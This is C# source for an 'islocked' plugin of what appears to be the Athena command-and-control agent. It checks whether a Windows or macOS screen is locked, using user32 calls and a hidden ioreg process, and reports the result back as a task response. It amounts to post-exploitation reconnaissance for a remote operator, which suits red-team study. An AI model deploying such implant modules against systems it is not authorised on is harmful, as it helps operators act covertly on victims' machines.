using Athena.Plugins;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;

namespace Plugins
{
    public static class NativeMethods
    {//https://stackoverflow.com/questions/3953297/detecting-if-the-screensaver-is-active-and-or-the-user-has-locked-the-screen-in/9858981#9858981 
     // Used to check if the screen saver is running
        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool SystemParametersInfo(uint uAction,
                                                       uint uParam,
                                                       ref bool lpvParam,
                                                       int fWinIni);

        // Used to check if the workstation is locked
        [DllImport("user32", SetLastError = true)]
        private static extern IntPtr OpenDesktop(string lpszDesktop,
                                                 uint dwFlags,
                                                 bool fInherit,
                                                 uint dwDesiredAccess);

        [DllImport("user32", SetLastError = true)]
        private static extern IntPtr OpenInputDesktop(uint dwFlags,
                                                      bool fInherit,
                                                      uint dwDesiredAccess);

        [DllImport("user32", SetLastError = true)]
        private static extern IntPtr CloseDesktop(IntPtr hDesktop);

        [DllImport("user32", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool SwitchDesktop(IntPtr hDesktop);

        // Check if the workstation has been locked.
        public static string IsWorkstationLocked()
        {
            const int DESKTOP_SWITCHDESKTOP = 256;
            IntPtr hwnd = OpenInputDesktop(0, false, DESKTOP_SWITCHDESKTOP);

            if (hwnd == IntPtr.Zero)
            {
                // Could not get the input desktop, might be locked already?
                hwnd = OpenDesktop("Default", 0, false, DESKTOP_SWITCHDESKTOP);
            }

            // Can we switch the desktop?
            if (hwnd != IntPtr.Zero)
            {
                if (SwitchDesktop(hwnd))
                {
                    string Unlocked = ("[*] - Unlocked");
                    CloseDesktop(hwnd);
                    return Unlocked;
                }
                else
                {
                    CloseDesktop(hwnd);
                    string Locked = ("[*] - Locked");
                    return Locked;
                }
            }
            return "Error";
        }
        // Check if the screensaver is busy running.
        public static string IsScreensaverRunning()
        {
            const int SPI_GETSCREENSAVERRUNNING = 114;
            bool isRunning = false;

            if (!SystemParametersInfo(SPI_GETSCREENSAVERRUNNING, 0, ref isRunning, 0))
            {
                // Could not detect screen saver status...
                return "Screensaver status undetectable";
            }

            if (isRunning)
            {
                // Screen saver is ON.
                string ScrOn = ("Screensaver On");

                return ScrOn;
            }
            string ScrOff = ("Screensaver Off");

            // Screen saver is OFF.
            return ScrOff;
        }
    }
    public class Plugin : AthenaPlugin
    {
        public override string Name => "islocked";
        public override void Execute(Dictionary<string, object> args)
        {
            try
            {
                StringBuilder output = new StringBuilder();
                if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
                {
                    if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
                    {
                        //output.Append("[*] - Detected OSX");
                        //string OSXcommand = "\"ioreg -n Root -d1 -a | grep CGSSession\"";
                        //string OSXcommand = "ps";
                        System.Diagnostics.Process process = new System.Diagnostics.Process();
                        System.Diagnostics.ProcessStartInfo startInfo = new System.Diagnostics.ProcessStartInfo();
                        startInfo.WindowStyle = System.Diagnostics.ProcessWindowStyle.Hidden;
                        startInfo.FileName = "/usr/sbin/ioreg";
                        startInfo.Arguments = "-n Root -d1 -a";
                        startInfo.UseShellExecute = false;
                        process.StartInfo = startInfo;
                        process.StartInfo.RedirectStandardOutput = true; // Redirecting so we can get output
                        process.Start();
                        try
                        {
                            //output.Append(process.StandardOutput.ReadToEnd()); // hide this after we do the logic to check
                            if (process.StandardOutput.ReadToEnd().Contains("CGSSessionScreenIsLocked"))
                            {
                                output.Append("Screen is locked");
                            }
                            else
                            {
                                output.Append("Screen is unlocked");
                            }
                        }
                        catch (Exception e)
                        {
                            output.Append(e);
                        }
                    }
                }
                else
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                {
                    //output.Append("[*] - Detected Windows" + "\n");
                    output.Append(NativeMethods.IsWorkstationLocked());
                    output.Append(NativeMethods.IsScreensaverRunning());
                }
                else
                if (RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
                {
                    //output.Append("[*] - Detected Linux" + "\n");
                    //gconftool-2 --get /apps/gnome-screensaver/lock_enabled
                    //isLocked=$(gdbus call -e -d com.canonical.Unity -o /com/canonical/Unity/Session -m com.canonical.Unity.Session.IsLocked | grep -ioP "(true)|(false)")
                    output.Append("[*] - Not Implemented");
                }

                PluginHandler.AddResponse(new ResponseResult()
                {
                    completed = "true",
                    user_output = output.ToString(),
                    task_id = (string)args["task-id"]
                });
            }
            catch (Exception e)
            {
                PluginHandler.AddResponse(new ResponseResult()
                {
                    completed = "true",
                    user_output = e.ToString(),
                    task_id = (string)args["task-id"],
                    status = "error"
                });
            }
        }
    }
}
